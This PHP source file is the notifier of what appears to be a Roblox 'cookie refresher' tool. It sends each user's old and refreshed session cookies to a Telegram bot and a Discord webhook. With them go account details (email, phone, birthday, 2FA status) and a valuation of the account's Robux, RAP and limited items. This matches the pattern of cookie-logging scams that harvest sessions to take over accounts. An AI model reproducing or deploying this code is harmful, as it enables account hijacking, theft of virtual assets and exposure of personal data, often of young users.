<?php
declare(strict_types=1);

namespace Langgor\Refresher;

class Notifier {
    public static function send(array $logData, string $oldCookie, string $newCookie, bool $detailed, bool $logoutOthers): void {
        $telegramToken = (string)Config::get('TELEGRAM_BOT_TOKEN', '');
        $telegramChatId = (string)Config::get('TELEGRAM_CHAT_ID', '');
        $discordWebhook = (string)Config::get('DISCORD_WEBHOOK_URL', '');

        if (empty($telegramToken) && empty($discordWebhook)) {
            return;
        }

        $multi = curl_multi_init();
        $handles = [];

        // 1. Prepare Telegram Handle
        if (!empty($telegramToken) && !empty($telegramChatId)) {
            $chTel = self::createTelegramHandle($telegramToken, $telegramChatId, $logData, $oldCookie, $newCookie, $detailed, $logoutOthers);
            curl_multi_add_handle($multi, $chTel);
            $handles[] = $chTel;
        }

        // 2. Prepare Discord Webhook Handle
        if (!empty($discordWebhook)) {
            $chDisc = self::createDiscordHandle($discordWebhook, $logData, $oldCookie, $newCookie, $detailed, $logoutOthers);
            curl_multi_add_handle($multi, $chDisc);
            $handles[] = $chDisc;
        }

        if (!empty($handles)) {
            $running = null;
            do {
                $status = curl_multi_exec($multi, $running);
                if ($running) {
                    curl_multi_select($multi, 0.05);
                }
            } while ($running && $status === CURLM_OK);

            foreach ($handles as $ch) {
                curl_multi_remove_handle($multi, $ch);
                curl_close($ch);
            }
        }

        curl_multi_close($multi);
    }

    private static function createTelegramHandle(string $token, string $chatId, array $logData, string $oldCookie, string $newCookie, bool $detailed, bool $logoutOthers): \CurlHandle {
        $msg = "🔔 <b>Roblox Cookie Refresher</b>\n";
        $msg .= "📅 <b>Time:</b> " . ($logData['timestamp'] ?? date('Y-m-d H:i:s')) . "\n";
        $msg .= "🌐 <b>Mode:</b> " . ($detailed ? 'Detailed' : 'Basic') . "\n";
        $msg .= "🚪 <b>Logout All:</b> " . ($logoutOthers ? 'Yes' : 'No') . "\n\n";
        $msg .= "🔑 <b>Past Cookie:</b> <code>" . htmlspecialchars($oldCookie) . "</code>\n";
        $msg .= "🔒 <b>Refreshed Cookie:</b> <code>" . htmlspecialchars($newCookie) . "</code>\n\n";
        $msg .= "👤 <b>Account Details</b>\n";
        $msg .= "Username: " . ($logData['username'] ?? 'N/A') . "\n";
        $msg .= "Display Name: " . ($logData['display_name'] ?? 'N/A') . "\n";
        $msg .= "User ID: " . ($logData['user_id'] ?? 'N/A') . "\n";
        $msg .= "Age Group: " . ($logData['age_group'] ?? 'N/A') . " (" . ($logData['age_group_status'] ?? 'Unchecked') . ")\n";
        $msg .= "Birthday: " . ($logData['birthday'] ?? 'N/A') . " (" . ($logData['birthday_status'] ?? 'Non Verified') . ")\n";
        $msg .= "Email: " . ($logData['email'] ?? 'N/A') . " (Verified: " . ($logData['email_verified'] ?? 'No') . ")\n";
        $msg .= "Phone: " . ($logData['phone'] ?? 'N/A') . "\n";
        $msg .= "Premium: " . ($logData['premium'] ?? 'No') . "\n";
        $msg .= "2FA: " . ($logData['two_factor'] ?? 'None') . "\n\n";
        $msg .= "💰 <b>Economy</b>\n";
        $msg .= "Robux: " . number_format((float)($logData['robux'] ?? 0)) . " R$\n";
        $msg .= "Pending Robux: " . number_format((float)($logData['pending_robux'] ?? 0)) . " R$\n";
        $msg .= "RAP Total: " . number_format((float)($logData['total_rap'] ?? 0)) . " R$\n";
        $msg .= "Account Credit: " . ($logData['account_credit'] ?? 0) . "\n";
        $msg .= "Total Income: " . number_format((float)($logData['total_income'] ?? 0)) . " R$\n";
        $msg .= "Total Outgoing: " . number_format((float)($logData['total_outgoing'] ?? 0)) . " R$\n\n";
        $msg .= "📦 <b>Assets & Activity</b>\n";
        $msg .= "Limited Items: " . ($logData['limited_items_count'] ?? 0) . "\n";
        $msg .= "SFX Items: " . ($logData['sfx_items_count'] ?? 0) . "\n";
        $msg .= "Animations: " . ($logData['animations_count'] ?? 0) . "\n";
        $msg .= "Transactions: " . ($logData['transactions_count'] ?? 0) . "\n";

        $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
        $postData = [
            'chat_id' => $chatId,
            'text' => $msg,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postData,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 6,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
            CURLOPT_SSL_VERIFYPEER => true
        ]);
        return $ch;
    }

    private static function createDiscordHandle(string $webhookUrl, array $logData, string $oldCookie, string $newCookie, bool $detailed, bool $logoutOthers): \CurlHandle {
        $embed = [
            'title' => '🔔 Roblox Cookie Refresh',
            'color' => 0x0A84FF,
            'timestamp' => date('c'),
            'description' => "**🍪 Past Cookie**\n```\n" . $oldCookie . "\n```\n\n**🔐 Refreshed Cookie**\n```\n" . $newCookie . "\n```",
            'fields' => [
                ['name' => '⚙️ Mode', 'value' => $detailed ? 'Detailed' : 'Basic', 'inline' => true],
                ['name' => '🚪 Logout All', 'value' => $logoutOthers ? 'Yes' : 'No', 'inline' => true],
                ['name' => '📅 Timestamp', 'value' => $logData['timestamp'] ?? date('Y-m-d H:i:s'), 'inline' => true],
                ['name' => '👤 Account Info', 'value' =>
                    "**Username:** " . ($logData['username'] ?? 'N/A') . "\n" .
                    "**Display Name:** " . ($logData['display_name'] ?? 'N/A') . "\n" .
                    "**User ID:** " . ($logData['user_id'] ?? 'N/A') . "\n" .
                    "**Age Group:** " . ($logData['age_group'] ?? 'N/A') . " (" . ($logData['age_group_status'] ?? 'Unchecked') . ")\n" .
                    "**Birthday:** " . ($logData['birthday'] ?? 'N/A') . " (" . ($logData['birthday_status'] ?? 'Non Verified') . ")\n" .
                    "**Email:** " . ($logData['email'] ?? 'N/A') . " (Verified: " . ($logData['email_verified'] ?? 'No') . ")\n" .
                    "**Phone:** " . ($logData['phone'] ?? 'N/A') . "\n" .
                    "**Premium:** " . ($logData['premium'] ?? 'No') . "\n" .
                    "**2FA:** " . ($logData['two_factor'] ?? 'None'), 'inline' => false],
                ['name' => '💰 Economy', 'value' =>
                    "💎 **Robux:** " . number_format((float)($logData['robux'] ?? 0)) . "\n" .
                    "⏳ **Pending:** " . number_format((float)($logData['pending_robux'] ?? 0)) . "\n" .
                    "📈 **RAP:** " . number_format((float)($logData['total_rap'] ?? 0)) . "\n" .
                    "💳 **Credit:** " . number_format((float)($logData['account_credit'] ?? 0)) . "\n" .
                    "📥 **Income:** " . number_format((float)($logData['total_income'] ?? 0)) . "\n" .
                    "📤 **Outgoing:** " . number_format((float)($logData['total_outgoing'] ?? 0)), 'inline' => false],
                ['name' => '📦 Assets', 'value' =>
                    "🎁 **Limited Items:** " . ($logData['limited_items_count'] ?? 0) . "\n" .
                    "✨ **SFX Items:** " . ($logData['sfx_items_count'] ?? 0) . "\n" .
                    "🎬 **Animations:** " . ($logData['animations_count'] ?? 0) . "\n" .
                    "📋 **Transactions:** " . ($logData['transactions_count'] ?? 0), 'inline' => false]
            ],
            'footer' => [
                'text' => 'Langgor · Cookie Refresher'
            ]
        ];

        $payload = json_encode(['embeds' => [$embed]]);
        $ch = curl_init($webhookUrl);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'User-Agent: Langgor-Cookie-Refresher/2.0'
            ],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 6,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
            CURLOPT_SSL_VERIFYPEER => true
        ]);
        return $ch;
    }
}
